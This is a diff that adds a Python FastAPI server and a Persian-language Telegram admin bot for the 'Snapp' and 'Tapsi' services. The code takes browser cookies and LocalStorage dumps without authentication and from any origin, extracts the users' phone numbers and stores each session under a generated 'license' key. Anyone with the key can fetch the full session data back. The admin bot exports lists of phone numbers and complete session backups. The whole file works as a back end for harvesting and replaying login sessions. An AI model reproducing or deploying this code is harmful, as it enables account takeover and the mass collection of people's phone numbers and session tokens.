@@ -1,0 +1,655 @@
+# -*- coding: utf-8 -*-
+import logging
+import json
+import os
+import re
+import csv
+import uuid
+import asyncio
+import redis
+import io
+from datetime import datetime
+
+from fastapi import FastAPI, HTTPException
+from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import JSONResponse
+from pydantic import BaseModel
+import uvicorn
+
+from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, Bot
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    CallbackQueryHandler,
+    ContextTypes,
+)
+
+# --- لاگ‌ها ---
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# --- متغیرهای محیطی ---
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "توکن_ربات_اسنپ_را_اینجا_بگذارید")
+allowed_users_env = os.getenv("ALLOWED_USER_IDS", "آیدی_عددی_ادمین_را_اینجا_بگذارید")
+ALLOWED_USER_IDS = [int(x.strip()) for x in allowed_users_env.split(",") if x.strip().isdigit()]
+
+REDIS_URL = os.getenv("REDIS_URL")
+PORT = int(os.getenv("PORT", 8000))
+REDIS_PREFIX = "snapp:license:"
+
+# --- اتصال به ردیس ---
+try:
+    if REDIS_URL:
+        redis_client = redis.from_url(REDIS_URL, decode_responses=True)
+        redis_client.ping()
+        logger.info("✅ اتصال به ردیس (پروژه مدیریت اسنپ) موفق بود.")
+    else:
+        redis_client = None
+except Exception as e:
+    redis_client = None
+    logger.error(f"❌ خطا در اتصال به ردیس اسنپ: {e}")
+
+
+# --- تولید لایسنس با پیشوند دقیق Snapp ---
+def generate_snapp_license() -> str:
+    return f"Snapp-{str(uuid.uuid4())[:8].upper()}-{str(uuid.uuid4())[:8].upper()}"
+
+
+def normalize_license_key(raw_key: str) -> str:
+    """استانداردسازی کلید لایسنس به فرمت Snapp-XXXX-XXXX بدون حساسیت به حروف بزرگ و کوچک."""
+    cleaned = (raw_key or "").strip()
+    if cleaned.lower().startswith("snapp-"):
+        suffix = cleaned[6:].upper()
+        return f"Snapp-{suffix}"
+    if cleaned.lower().startswith("tapsi-"):
+        suffix = cleaned[6:].upper()
+        return f"TAPSI-{suffix}"
+    return cleaned
+
+
+def find_redis_key_for_license(raw_key: str):
+    """جستجوی کلید در ردیس با پشتیبانی از هر دو حالت Snapp- و SNAPP-."""
+    if not redis_client:
+        return None, None
+    norm_key = normalize_license_key(raw_key)
+    candidates = [
+        f"{REDIS_PREFIX}{norm_key}",
+        f"{REDIS_PREFIX}{raw_key.strip()}",
+        f"{REDIS_PREFIX}{raw_key.strip().upper()}",
+    ]
+    for rk in candidates:
+        val = redis_client.get(rk)
+        if val:
+            return rk, val
+    return None, None
+
+
+def normalize_iran_phone(raw_phone: str) -> str:
+    if not raw_phone:
+        return ""
+    digits = re.sub(r"\D", "", str(raw_phone))
+    if digits.startswith("989") and len(digits) == 12:
+        return "0" + digits[2:]
+    if digits.startswith("00989") and len(digits) == 14:
+        return "0" + digits[4:]
+    if digits.startswith("9") and len(digits) == 10:
+        return "0" + digits
+    if digits.startswith("09") and len(digits) == 11:
+        return digits
+    return ""
+
+
+def extract_phone_from_local_storage(local_storage_str: str, provided_phone: str = "unknown") -> str:
+    """استخراج خودکار شماره موبایل از داخل کلیدها و مقادیر LocalStorage اسنپ."""
+    norm_provided = normalize_iran_phone(provided_phone)
+    if norm_provided:
+        return norm_provided
+
+    if not local_storage_str:
+        return "نامشخص"
+
+    priority_keys = ("cellphone", "phone", "mobile", "phone_number", "phoneNumber", "username", "msisdn", "user_phone")
+    try:
+        parsed = json.loads(local_storage_str)
+        if isinstance(parsed, dict):
+            for k, v in parsed.items():
+                if any(pk in str(k).lower() for pk in priority_keys):
+                    candidate = normalize_iran_phone(str(v))
+                    if candidate:
+                        return candidate
+                if isinstance(v, str) and (v.startswith("{") or v.startswith("[")):
+                    try:
+                        inner = json.loads(v)
+                        if isinstance(inner, dict):
+                            for ik, iv in inner.items():
+                                if any(pk in str(ik).lower() for pk in priority_keys):
+                                    candidate = normalize_iran_phone(str(iv))
+                                    if candidate:
+                                        return candidate
+                    except Exception:
+                        pass
+    except Exception:
+        pass
+
+    matches = re.findall(r"(?:\+98|0098|98|0)?(9\d{9})\b", local_storage_str)
+    if matches:
+        return "0" + matches[0]
+
+    return provided_phone if provided_phone and provided_phone != "unknown" else "نامشخص"
+
+
+def fetch_all_snapp_records() -> list:
+    """دریافت و مرتب‌سازی تمامی رکوردهای لایسنس اسنپ از ردیس (جدیدترین در ابتدا)."""
+    if not redis_client:
+        return []
+    keys = redis_client.keys(f"{REDIS_PREFIX}*")
+    if not keys:
+        return []
+
+    records = []
+    try:
+        raw_values = redis_client.mget(keys)
+        for raw in raw_values:
+            if not raw:
+                continue
+            try:
+                item = json.loads(raw)
+                records.append(item)
+            except Exception:
+                continue
+    except Exception as e:
+        logger.error(f"Error fetching records: {e}")
+
+    records.sort(key=lambda x: x.get("created_at", ""), reverse=True)
+    return records
+
+
+# ======================== مدل دریافت داده از اپلیکیشن / افزونه ========================
+class SnappData(BaseModel):
+    cookies: str = "empty"
+    local_storage: str
+    phone_number: str = "unknown"
+
+
+# ======================== وب‌سرور FastAPI ========================
+app = FastAPI(title="Snapp License & Storage API", docs_url=None, redoc_url=None)
+
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["*"],
+    allow_credentials=True,
+    allow_methods=["*"],
+    allow_headers=["*"],
+)
+
+
+@app.post("/api/snapp/create-license")
+@app.post("/api/tapsi/create-license")
+async def create_snapp_license(data: SnappData):
+    """دریافت LocalStorage، استخراج شماره و صدور لایسنس با پیشوند Snapp."""
+    if not redis_client:
+        raise HTTPException(status_code=503, detail="Database unavailable")
+
+    raw_storage = (data.local_storage or "").strip()
+    if not raw_storage or raw_storage == "{}":
+        raise HTTPException(status_code=400, detail="LocalStorage is empty")
+
+    license_key = generate_snapp_license()
+    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    detected_phone = extract_phone_from_local_storage(raw_storage, data.phone_number)
+
+    try:
+        storage_obj = json.loads(raw_storage)
+        storage_keys_count = len(storage_obj) if isinstance(storage_obj, dict) else 1
+    except Exception:
+        storage_keys_count = 1
+
+    redis_data = {
+        "license_key": license_key,
+        "phone_number": detected_phone,
+        "local_storage": raw_storage,
+        "cookies": data.cookies or "empty",
+        "storage_keys_count": storage_keys_count,
+        "created_at": now_str,
+    }
+
+    try:
+        redis_client.set(f"{REDIS_PREFIX}{license_key}", json.dumps(redis_data, ensure_ascii=False))
+    except Exception as e:
+        logger.error(f"Redis save error: {e}")
+        raise HTTPException(status_code=500, detail="Database save error")
+
+    if TELEGRAM_BOT_TOKEN and TELEGRAM_BOT_TOKEN != "توکن_ربات_اسنپ_را_اینجا_بگذارید":
+        bot = Bot(token=TELEGRAM_BOT_TOKEN)
+        for admin_id in ALLOWED_USER_IDS:
+            try:
+                msg = (
+                    "━━━━━━━━━━━━━━━━━━━━━━\n"
+                    "🟢 *لایسنس جدید اسنپ صادر شد!*\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                    f"🔑 لایسنس: `{license_key}`\n"
+                    f"📱 شماره موبایل: `{detected_phone}`\n"
+                    f"🗂 تعداد کلیدهای LocalStorage: `{storage_keys_count}`\n"
+                    f"⏰ زمان ثبت: `{now_str}`\n\n"
+                    "✅ اطلاعات LocalStorage با موفقیت در ردیس ذخیره شد."
+                )
+                await bot.send_message(chat_id=admin_id, text=msg, parse_mode="Markdown")
+            except Exception as e:
+                logger.error(f"Failed to notify admin {admin_id}: {e}")
+
+    return JSONResponse(
+        content={
+            "success": True,
+            "license_key": license_key,
+            "phone_number": detected_phone,
+            "message": "Snapp license created successfully",
+        }
+    )
+
+
+@app.get("/api/snapp/get-license/{license_key}")
+@app.get("/api/tapsi/get-license/{license_key}")
+async def get_snapp_license(license_key: str):
+    """دریافت اطلاعات LocalStorage با کلید لایسنس برای اپلیکیشن کلاینت اسنپ."""
+    clean_key = (license_key or "").strip()
+    if not (clean_key.lower().startswith("snapp-") or clean_key.lower().startswith("tapsi-")):
+        raise HTTPException(status_code=400, detail="فرمت لایسنس نامعتبر است (باید با Snapp- شروع شود)")
+    if not redis_client:
+        raise HTTPException(status_code=503, detail="Database unavailable")
+
+    _, raw = find_redis_key_for_license(clean_key)
+    if not raw:
+        raise HTTPException(status_code=404, detail="لایسنس مورد نظر یافت نشد یا منقضی شده است")
+
+    return JSONResponse(content={"success": True, "data": json.loads(raw)})
+
+
+@app.get("/health")
+async def health_check():
+    db_status = "connected" if redis_client else "disconnected"
+    return {"status": "ok", "service": "snapp-license-manager", "database": db_status}
+
+
+# ======================== کیبوردهای پنل مدیریت تلگرام ========================
+def kb_snapp_admin() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("📊 آمار و وضعیت دیتابیس", callback_data="snapp_stats"),
+            InlineKeyboardButton("📋 لیست لایسنس و شماره‌ها", callback_data="snapp_list_inline"),
+        ],
+        [
+            InlineKeyboardButton("📄 گزارش لایسنس + شماره (TXT)", callback_data="snapp_export_pairs"),
+            InlineKeyboardButton("📊 خروجی اکسل کامل (CSV)", callback_data="snapp_export_csv"),
+        ],
+        [
+            InlineKeyboardButton("🔑 خروجی فقط لایسنس‌ها", callback_data="snapp_export_keys"),
+            InlineKeyboardButton("📱 خروجی فقط شماره‌ها", callback_data="snapp_export_phones"),
+        ],
+        [
+            InlineKeyboardButton("📦 بکاپ کامل LocalStorage (JSON)", callback_data="snapp_export_json"),
+        ],
+        [
+            InlineKeyboardButton("🔍 راهنمای جستجو و حذف", callback_data="snapp_help"),
+            InlineKeyboardButton("🗑 پاک‌سازی کل دیتابیس", callback_data="snapp_clear_confirm"),
+        ],
+    ])
+
+
+def kb_back_to_main() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔙 بازگشت به پنل مدیریت", callback_data="snapp_home")]
+    ])
+
+
+# ======================== هندلرهای ربات تلگرام ========================
+def is_admin(user_id: int) -> bool:
+    return user_id in ALLOWED_USER_IDS
+
+
+def get_welcome_text() -> str:
+    records = fetch_all_snapp_records()
+    total = len(records)
+    db_badge = "🟢 متصل" if redis_client else "🔴 قطع"
+    return (
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "🚀 *پنل مدیریت حرفه‌ای لایسنس و دیتابیس اسنپ*\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"📡 وضعیت دیتابیس ردیس: *{db_badge}*\n"
+        f"🗄 مجموع لایسنس‌های ثبت‌شده: `{total}`\n\n"
+        "از منوی زیر گزارش یا خروجی مورد نظر خود را انتخاب کنید:"
+    )
+
+
+async def start_snapp_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not update.message or not is_admin(update.message.from_user.id):
+        return
+    await update.message.reply_text(
+        get_welcome_text(),
+        reply_markup=kb_snapp_admin(),
+        parse_mode="Markdown",
+    )
+
+
+async def get_license_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """جستجوی لایسنس با کلید لایسنس یا شماره موبایل: /get Snapp-XXXX یا /get 0912..."""
+    if not update.message or not is_admin(update.message.from_user.id):
+        return
+    if not context.args:
+        await update.message.reply_text(
+            "⚠️ *راهنمای جستجو:*\n"
+            "`/get Snapp-XXXX-XXXX`\n"
+            "یا جستجو با شماره موبایل:\n"
+            "`/get 09123456789`",
+            parse_mode="Markdown",
+        )
+        return
+
+    query_str = context.args[0].strip()
+    records = fetch_all_snapp_records()
+    matched = [
+        r for r in records
+        if r.get("license_key", "").lower() == query_str.lower()
+        or r.get("phone_number", "") == query_str
+    ]
+
+    if not matched:
+        await update.message.reply_text(f"❌ هیچ رکوردی برای `{query_str}` یافت نشد.", parse_mode="Markdown")
+        return
+
+    for item in matched[:5]:
+        lic = item.get("license_key", "-")
+        phone = item.get("phone_number", "نامشخص")
+        created = item.get("created_at", "-")
+        storage_str = item.get("local_storage", "{}")
+
+        doc = io.BytesIO(storage_str.encode("utf-8"))
+        doc.name = f"{lic}_{phone}.json"
+        caption = (
+            "🔍 *اطلاعات لایسنس یافت‌شده:*\n\n"
+            f"🔑 لایسنس: `{lic}`\n"
+            f"📱 شماره: `{phone}`\n"
+            f"⏰ زمان ثبت: `{created}`\n"
+            f"🗑 حذف سریع: `/delete {lic}`"
+        )
+        await update.message.reply_document(doc, caption=caption, parse_mode="Markdown")
+
+
+async def delete_snapp_license(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """حذف لایسنس با کلید."""
+    if not update.message or not is_admin(update.message.from_user.id):
+        return
+    if not context.args:
+        await update.message.reply_text(
+            "⚠️ *راهنمای حذف:*\n`/delete Snapp-XXXX-XXXX`",
+            parse_mode="Markdown",
+        )
+        return
+
+    target = context.args[0].strip()
+    rk, _ = find_redis_key_for_license(target)
+    if rk and redis_client and redis_client.delete(rk):
+        await update.message.reply_text(f"✅ لایسنس `{target}` با موفقیت از دیتابیس حذف شد.", parse_mode="Markdown")
+    else:
+        await update.message.reply_text(f"⚠️ لایسنس `{target}` در دیتابیس یافت نشد.", parse_mode="Markdown")
+
+
+async def snapp_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    if not query or not is_admin(query.from_user.id):
+        if query:
+            await query.answer("⛔️ دسترسی غیرمجاز.", show_alert=True)
+        return
+
+    if not redis_client:
+        await query.answer("❌ دیتابیس ردیس متصل نیست!", show_alert=True)
+        return
+
+    data_cb = query.data
+    records = fetch_all_snapp_records()
+    now_tag = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+    if data_cb == "snapp_home":
+        await query.answer()
+        await query.edit_message_text(
+            get_welcome_text(),
+            reply_markup=kb_snapp_admin(),
+            parse_mode="Markdown",
+        )
+
+    elif data_cb == "snapp_stats":
+        await query.answer()
+        total = len(records)
+        known_phones = {
+            r.get("phone_number")
+            for r in records
+            if r.get("phone_number") and r.get("phone_number") not in ("unknown", "نامشخص")
+        }
+        today_prefix = datetime.now().strftime("%Y-%m-%d")
+        today_count = sum(1 for r in records if str(r.get("created_at", "")).startswith(today_prefix))
+        latest_time = records[0].get("created_at", "-") if records else "بدون رکورد"
+
+        text = (
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "📊 *گزارش آماری دیتابیس اسنپ*\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"🗂 کل لایسنس‌های موجود: `{total}`\n"
+            f"📱 شماره‌های یکتای شناسایی‌شده: `{len(known_phones)}`\n"
+            f"📅 لایسنس‌های ثبت‌شده امروز: `{today_count}`\n"
+            f"🕓 آخرین ثبت: `{latest_time}`\n"
+        )
+        await query.edit_message_text(text, reply_markup=kb_back_to_main(), parse_mode="Markdown")
+
+    elif data_cb == "snapp_list_inline":
+        if not records:
+            await query.answer("⚠️ دیتابیس خالی است!", show_alert=True)
+            return
+
+        await query.answer()
+        preview_limit = 30
+        lines = [
+            "━━━━━━━━━━━━━━━━━━━━━━",
+            f"📋 *لیست لایسنس‌ها و شماره‌ها ({min(len(records), preview_limit)} مورد اخیر از {len(records)})*",
+            "━━━━━━━━━━━━━━━━━━━━━━\n",
+        ]
+        for idx, r in enumerate(records[:preview_limit], start=1):
+            lic = r.get("license_key", "-")
+            phone = r.get("phone_number", "نامشخص")
+            lines.append(f"{idx}. 📱 `{phone}` ➔ `{lic}`")
+
+        if len(records) > preview_limit:
+            lines.append(f"\n💡 _برای مشاهده تمام {len(records)} مورد، دکمه «گزارش لایسنس + شماره (TXT)» را بزنید._")
+
+        await query.edit_message_text(
+            "\n".join(lines),
+            reply_markup=kb_back_to_main(),
+            parse_mode="Markdown",
+        )
+
+    elif data_cb == "snapp_export_pairs":
+        if not records:
+            await query.answer("⚠️ دیتابیس خالی است!", show_alert=True)
+            return
+
+        await query.answer("⏳ در حال ساخت فایل گزارش لایسنس و شماره‌ها...")
+        lines = [
+            "==========================================",
+            "   گزارش لایسنس‌های اسنپ به همراه شماره   ",
+            f"   تاریخ خروجی: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+            f"   تعداد کل: {len(records)}",
+            "==========================================\n",
+        ]
+        for idx, r in enumerate(records, start=1):
+            lic = r.get("license_key", "-")
+            phone = r.get("phone_number", "نامشخص")
+            created = r.get("created_at", "-")
+            lines.append(f"[{idx}] شماره: {phone} | لایسنس: {lic} | زمان: {created}")
+
+        doc = io.BytesIO("\n".join(lines).encode("utf-8"))
+        doc.name = f"Snapp_License_Phone_Report_{now_tag}.txt"
+        await query.message.reply_document(
+            doc,
+            caption=(
+                "📄 *گزارش کامل لایسنس‌ها به همراه شماره موبایل*\n"
+                f"🔢 تعداد کل: `{len(records)}`"
+            ),
+            parse_mode="Markdown",
+        )
+
+    elif data_cb == "snapp_export_keys":
+        if not records:
+            await query.answer("⚠️ دیتابیس خالی است!", show_alert=True)
+            return
+
+        await query.answer("⏳ در حال استخراج لیست لایسنس‌ها...")
+        keys_only = [r.get("license_key", "") for r in records if r.get("license_key")]
+        doc = io.BytesIO("\n".join(keys_only).encode("utf-8"))
+        doc.name = f"Snapp_Only_Licenses_{now_tag}.txt"
+        await query.message.reply_document(
+            doc,
+            caption=f"🔑 *لیست خام کلیدهای لایسنس اسنپ*\n🔢 تعداد: `{len(keys_only)}`",
+            parse_mode="Markdown",
+        )
+
+    elif data_cb == "snapp_export_phones":
+        if not records:
+            await query.answer("⚠️ دیتابیس خالی است!", show_alert=True)
+            return
+
+        await query.answer("⏳ در حال استخراج لیست شماره‌ها...")
+        phones_list = []
+        for r in records:
+            p = r.get("phone_number", "")
+            if p and p not in ("unknown", "نامشخص") and p not in phones_list:
+                phones_list.append(p)
+
+        content = "\n".join(phones_list) if phones_list else "هیچ شماره مشخصی ثبت نشده است."
+        doc = io.BytesIO(content.encode("utf-8"))
+        doc.name = f"Snapp_Phones_{now_tag}.txt"
+        await query.message.reply_document(
+            doc,
+            caption=f"📱 *لیست شماره‌های یکتای استخراج‌شده*\n🔢 تعداد: `{len(phones_list)}`",
+            parse_mode="Markdown",
+        )
+
+    elif data_cb == "snapp_export_csv":
+        if not records:
+            await query.answer("⚠️ دیتابیس خالی است!", show_alert=True)
+            return
+
+        await query.answer("⏳ در حال تولید فایل CSV (اکسل)...")
+        output = io.StringIO()
+        writer = csv.writer(output)
+        writer.writerow(["ردیف", "کلید لایسنس", "شماره موبایل", "تعداد کلیدهای LocalStorage", "زمان ثبت"])
+        for idx, r in enumerate(records, start=1):
+            writer.writerow([
+                idx,
+                r.get("license_key", ""),
+                r.get("phone_number", "نامشخص"),
+                r.get("storage_keys_count", "-"),
+                r.get("created_at", ""),
+            ])
+
+        doc = io.BytesIO(output.getvalue().encode("utf-8-sig"))
+        doc.name = f"Snapp_Report_{now_tag}.csv"
+        await query.message.reply_document(
+            doc,
+            caption=f"📊 *فایل اکسل (CSV) گزارش لایسنس‌ها و شماره‌ها*\n🔢 تعداد: `{len(records)}`",
+            parse_mode="Markdown",
+        )
+
+    elif data_cb == "snapp_export_json":
+        if not records:
+            await query.answer("⚠️ دیتابیس خالی است!", show_alert=True)
+            return
+
+        await query.answer("⏳ در حال آماده‌سازی بکاپ کامل JSON...")
+        json_bytes = json.dumps(records, ensure_ascii=False, indent=2).encode("utf-8")
+        doc = io.BytesIO(json_bytes)
+        doc.name = f"Snapp_Full_Backup_{now_tag}.json"
+        await query.message.reply_document(
+            doc,
+            caption=(
+                "📦 *بکاپ کامل دیتابیس اسنپ (شامل LocalStorage)*\n"
+                f"🔢 تعداد نشست‌ها: `{len(records)}`"
+            ),
+            parse_mode="Markdown",
+        )
+
+    elif data_cb == "snapp_help":
+        await query.answer()
+        help_text = (
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "🔍 *راهنمای دستورات مدیریتی ربات*\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            "1️⃣ *جستجوی لایسنس یا شماره موبایل:*\n"
+            "`/get Snapp-XXXX-XXXX`\n"
+            "`/get 09123456789`\n\n"
+            "2️⃣ *حذف یک لایسنس مشخص:*\n"
+            "`/delete Snapp-XXXX-XXXX`\n\n"
+            "3️⃣ *باز کردن پنل مدیریت:*\n"
+            "`/start` یا `/admin`"
+        )
+        await query.edit_message_text(help_text, reply_markup=kb_back_to_main(), parse_mode="Markdown")
+
+    elif data_cb == "snapp_clear_confirm":
+        await query.answer()
+        confirm_kb = InlineKeyboardMarkup([
+            [
+                InlineKeyboardButton("✅ بله، کل دیتابیس پاک شود", callback_data="snapp_clear_execute"),
+                InlineKeyboardButton("❌ انصراف", callback_data="snapp_home"),
+            ]
+        ])
+        await query.edit_message_text(
+            "⚠️ *هشدار جدی:*\n\n"
+            f"آیا از حذف تمامی `{len(records)}` لایسنس ذخیره شده در دیتابیس اسنپ اطمینان دارید؟\n"
+            "پیشنهاد می‌شود پیش از حذف، یک بکاپ JSON تهیه کنید.",
+            reply_markup=confirm_kb,
+            parse_mode="Markdown",
+        )
+
+    elif data_cb == "snapp_clear_execute":
+        keys = redis_client.keys(f"{REDIS_PREFIX}*")
+        deleted_count = redis_client.delete(*keys) if keys else 0
+        await query.answer(f"✅ {deleted_count} لایسنس حذف شد.", show_alert=True)
+        await query.edit_message_text(
+            get_welcome_text(),
+            reply_markup=kb_snapp_admin(),
+            parse_mode="Markdown",
+        )
+
+
+# ======================== اجرای همزمان ربات و وب‌سرور ========================
+async def run_bot():
+    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "توکن_ربات_اسنپ_را_اینجا_بگذارید":
+        logger.critical("❌ توکن ربات تلگرام تنظیم نشده است.")
+        return
+
+    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+    application.add_handler(CommandHandler("start", start_snapp_bot))
+    application.add_handler(CommandHandler("admin", start_snapp_bot))
+    application.add_handler(CommandHandler("get", get_license_cmd))
+    application.add_handler(CommandHandler("delete", delete_snapp_license))
+    application.add_handler(CallbackQueryHandler(snapp_callbacks, pattern="^snapp_"))
+
+    logger.info("🤖 ربات مدیریت اسنپ در حال راه‌اندازی...")
+    await application.initialize()
+    await application.start()
+    await application.updater.start_polling()
+    await asyncio.Event().wait()
+
+
+async def run_webserver():
+    config = uvicorn.Config(app=app, host="0.0.0.0", port=PORT, log_level="info")
+    server = uvicorn.Server(config)
+    logger.info(f"🌐 وب‌سرور مدیریت لایسنس اسنپ روی پورت {PORT} در حال راه‌اندازی...")
+    await server.serve()
+
+
+async def main():
+    await asyncio.gather(run_bot(), run_webserver())
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
